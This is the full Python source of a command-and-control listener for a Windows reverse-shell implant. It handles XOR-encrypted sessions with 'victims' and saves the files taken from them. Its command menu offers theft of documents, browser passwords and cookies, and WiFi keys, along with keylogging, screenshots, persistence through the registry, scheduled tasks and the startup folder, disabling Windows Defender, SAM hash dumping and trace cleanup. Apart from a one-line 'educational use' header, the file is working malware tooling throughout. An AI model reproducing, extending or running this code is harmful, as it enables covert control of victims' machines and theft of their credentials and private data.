#!/usr/bin/env python3
# listener.py v2.0 - Advanced Listener for Windows Reverse Shell
# Educational use / authorized pentesting only

# -------------------- IMPORTS --------------------
import socket               # TCP server socket
import sys                  # System exit
import base64               # Decode file chunks received from victim
import os                   # File system operations and local command execution
import time                 # Generate timestamps for default filenames
import datetime             # Session logging

# -------------------- CONFIGURATION --------------------
LISTEN_IP = "0.0.0.0"       # Listen on all available network interfaces
LISTEN_PORT = 4444          # Port to listen on (must match victim's ATTACKER_PORT)
XOR_KEY = 0x42              # Static XOR key – must match victim's XOR_KEY

# ANSI color codes for better readability
RST = "\033[0m"
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
M = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"

# Commands that return a file (status_msg + FILE_START/chunks/FILE_END)
FILE_COMMANDS = {"steal", "sysinfo", "screenshot", "browsers", "exfil"}

# Default file extensions for received files
FILE_EXTENSIONS = {
    "steal": ".zip",
    "sysinfo": ".tar",
    "screenshot": ".png",
    "browsers": ".zip",
    "exfil": ".tar",
}

# ASCII art banner
BANNER = f"""
{M}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ║
║    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ║
║    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ║
║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ║
║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗██║     ║
║    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ║
║                                                              ║
║          Advanced Reverse Shell Listener v2.0                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{RST}"""

# Local help message displayed when 'help' is typed in the listener
LOCAL_HELP = f"""
{C}{BOLD}═══════════════════════════════════════════════════════════════{RST}
{C}  REMOTE COMMANDS (sent to victim){RST}
{C}═══════════════════════════════════════════════════════════════{RST}

  {G}NAVIGATION:{RST}
    cd <dir>              Change directory
    pwd                   Print working directory
    ls [dir]              List directory

  {G}FILES:{RST}
    download <file>       Download file from victim
    upload <file>         Upload file to victim

  {Y}COLLECTION (return a file):{RST}
    steal                 Steal Desktop/Downloads/Docs/Pictures/Videos
    sysinfo               Full system enumeration (.tar)
    screenshot            Screen capture (.png)
    browsers              Browser data - cookies, passwords (.zip)
    exfil                 TOTAL exfiltration - all in one (.tar)

  {B}INFORMATION (text):{RST}
    status                Basic info (user, host, IP, admin)
    wifi                  Saved WiFi passwords
    clipboard             Current clipboard content
    software              Installed software
    privesc               Privilege escalation vectors

  {M}PERSISTENCE:{RST}
    persist               Install ALL persistence methods
    persist registry      Registry only (HKCU Run)
    persist task          Scheduled task only
    persist startup       Startup folder only
    persist check         Check persistence status
    persist remove        Remove all persistence

  {R}KEYLOGGER:{RST}
    keylog start          Start keylogger
    keylog stop           Stop keylogger
    keylog dump           View captured keystrokes
    keylog clear          Clear log

  {R}ADMIN (requires privileges):{RST}
    disable_defender      Disable Windows Defender
    dump_hashes           Extract SAM/SYSTEM/SECURITY

  {Y}UTILITIES:{RST}
    alert <msg>           Show popup on victim
    cleanup               Delete temporary traces
    ps <cmd>              Execute PowerShell directly
    exit                  Close connection (victim reconnects)
    kill                  Permanently kill victim process
    <cmd>                 Execute any cmd command

  {DIM}LOCAL (prefix '!'):{RST}
    !<cmd>                Execute command on YOUR machine
    !clear / !cls         Clear screen

{C}═══════════════════════════════════════════════════════════════{RST}
"""

# ===================== CRYPTO =====================

def xor_encrypt_decrypt(data: bytes) -> bytes:
    """Apply XOR cipher to data using the global XOR_KEY."""
    return bytes([b ^ XOR_KEY for b in data])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket after encrypting it and prefixing with length.
    Protocol: [4-byte big-endian length] + [XORed payload]
    Accepts either string (encoded to UTF-8) or bytes.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = xor_encrypt_decrypt(data)
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.send(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted UTF-8 string, or None if connection is closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    return xor_encrypt_decrypt(data).decode('utf-8', errors='replace')

# ===================== FILE HELPERS =====================

def receive_file_data(sock: socket.socket, save_path: str) -> tuple[bool, str]:
    """
    Receive a file from the victim using the custom protocol.
    Expects the stream to already be positioned after FILE_START.
    Reads chunks until FILE_END, decodes base64, and writes to save_path.
    Returns (True, success_message) or (False, error_message).
    """
    try:
        with open(save_path, 'wb') as f:
            while True:
                part = recv_encrypted(sock)
                if part is None:
                    return False, "Connection closed during reception"
                if part == "FILE_END":
                    break
                f.write(base64.b64decode(part))
        size = os.path.getsize(save_path)
        return True, f"Saved: {save_path} ({size:,} bytes)"
    except Exception as e:
        return False, f"Error: {e}"

def get_save_path(cmd_name: str) -> str:
    """Prompt the user for a save location with a sensible default."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    ext = FILE_EXTENSIONS.get(cmd_name, ".bin")
    default = f"{cmd_name}_{ts}{ext}"
    user_path = input(f"{Y}Save as [{default}]: {RST}").strip()
    return user_path if user_path else default

def handle_file_command(sock: socket.socket, cmd: str) -> bool:
    """
    Handle commands that return: status_msg + FILE_START + data + FILE_END.
    Reads status, if it's an error (starts with '[-]') displays it and stops.
    Otherwise, expects FILE_START, prompts for save path, and receives file.
    Returns False if connection is lost.
    """
    # Read status message (success or error)
    status = recv_encrypted(sock)
    if status is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    print(f"{C}{status}{RST}")

    # If status indicates an error, no file follows
    if status.startswith("[-]"):
        return True

    # Now expect FILE_START
    marker = recv_encrypted(sock)
    if marker is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    if marker != "FILE_START":
        print(f"{R}{marker}{RST}")
        return True

    save_path = get_save_path(cmd.split()[0])  # command name without args
    ok, msg = receive_file_data(sock, save_path)
    print(f"{G if ok else R}{'[+]' if ok else '[-]'} {msg}{RST}")
    return True

def handle_download(sock: socket.socket, cmd: str) -> bool:
    """
    Handle the 'download' command.
    The victim may respond with FILE_START (file follows) or an error text.
    """
    first = recv_encrypted(sock)
    if first is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    if first == "FILE_START":
        fname = cmd[9:].strip()
        default_name = os.path.basename(fname)
        user_path = input(f"{Y}Save as [{default_name}]: {RST}").strip()
        save_path = user_path if user_path else default_name
        ok, msg = receive_file_data(sock, save_path)
        print(f"{G if ok else R}{'[+]' if ok else '[-]'} {msg}{RST}")
    else:
        print(f"{R}{first}{RST}")
    return True

def handle_upload(sock: socket.socket, cmd: str) -> bool:
    """
    Handle the 'upload' command.
    Victim sends READY_FOR_UPLOAD, we send file chunks, then FILE_END.
    """
    filename = cmd[7:].strip()
    # Wait for READY_FOR_UPLOAD
    ready = recv_encrypted(sock)
    if ready != "READY_FOR_UPLOAD":
        print(f"{R}[!] Unexpected response: {ready}{RST}")
        return True

    if not os.path.exists(filename):
        print(f"{R}[-] Local file not found: {filename}{RST}")
        send_encrypted(sock, "FILE_END")
        final = recv_encrypted(sock)
        if final:
            print(final)
        return True

    try:
        with open(filename, 'rb') as f:
            while True:
                chunk = f.read(3 * 1024)
                if not chunk:
                    break
                send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
        send_encrypted(sock, "FILE_END")
    except Exception as e:
        print(f"{R}[-] Error reading file: {e}{RST}")
        send_encrypted(sock, "FILE_END")

    final = recv_encrypted(sock)
    if final:
        print(f"{G}{final}{RST}")
    return True

# ===================== SESSION LOG =====================

def log_session(addr: str, message: str):
    """Log session activity to a file named session_YYYY-MM-DD.log."""
    log_dir = "session_logs"
    os.makedirs(log_dir, exist_ok=True)
    date_str = datetime.datetime.now().strftime('%Y-%m-%d')
    log_file = os.path.join(log_dir, f"session_{date_str}.log")
    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] [{addr}] {message}\n")

# ===================== MAIN =====================

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)

    print(BANNER)
    print(f"{G}[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...{RST}")
    print(f"{DIM}    Type 'help' to see available commands{RST}\n")

    while True:
        client, addr = server.accept()
        addr_str = f"{addr[0]}:{addr[1]}"
        print(f"\n{G}{BOLD}[+] Connection received from {addr_str}!{RST}")
        log_session(addr_str, "CONNECTED")

        try:
            banner = recv_encrypted(client)
            if banner:
                print(f"{C}{banner}{RST}")
                log_session(addr_str, f"BANNER: {banner}")

            while True:
                cmd = input(f"\n{Y}{BOLD}shell>{RST} ").strip()
                if not cmd:
                    continue

                # --- Local commands (prefix '!') ---
                if cmd.startswith('!'):
                    local_cmd = cmd[1:].strip()
                    if local_cmd in ('clear', 'cls'):
                        os.system('cls' if os.name == 'nt' else 'clear')
                    elif local_cmd:
                        print(f"{B}[*] Local: {local_cmd}{RST}")
                        os.system(local_cmd)
                    continue

                if cmd == "help":
                    print(LOCAL_HELP)
                    continue

                # --- Send command to victim ---
                log_session(addr_str, f"CMD: {cmd}")
                send_encrypted(client, cmd)

                # --- Dispatch based on command type ---
                if cmd in ("exit", "kill"):
                    print(f"{R}[*] {'Connection closed' if cmd == 'exit' else 'Victim process terminated'}{RST}")
                    log_session(addr_str, f"SESSION END ({cmd})")
                    break

                elif cmd.startswith("upload "):
                    if not handle_upload(client, cmd):
                        break

                elif cmd.startswith("download "):
                    if not handle_download(client, cmd):
                        break

                elif cmd.split()[0] in FILE_COMMANDS:
                    if not handle_file_command(client, cmd):
                        break

                else:
                    # Text command: single response
                    response = recv_encrypted(client)
                    if response is None:
                        print(f"{R}[!] Connection closed by client{RST}")
                        log_session(addr_str, "CONNECTION LOST")
                        break
                    print(response)
                    log_session(addr_str, f"RESPONSE: {response[:200]}")

        except (socket.error, ConnectionResetError) as e:
            print(f"{R}[-] Error: {e}{RST}")
            log_session(addr_str, f"ERROR: {e}")
        except KeyboardInterrupt:
            print(f"\n{Y}[*] Ctrl+C in session. Returning to listen...{RST}")
        finally:
            client.close()
            print(f"{R}[*] Connection closed. Waiting for new connection...\n{RST}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exiting...{RST}")
        sys.exit(0)
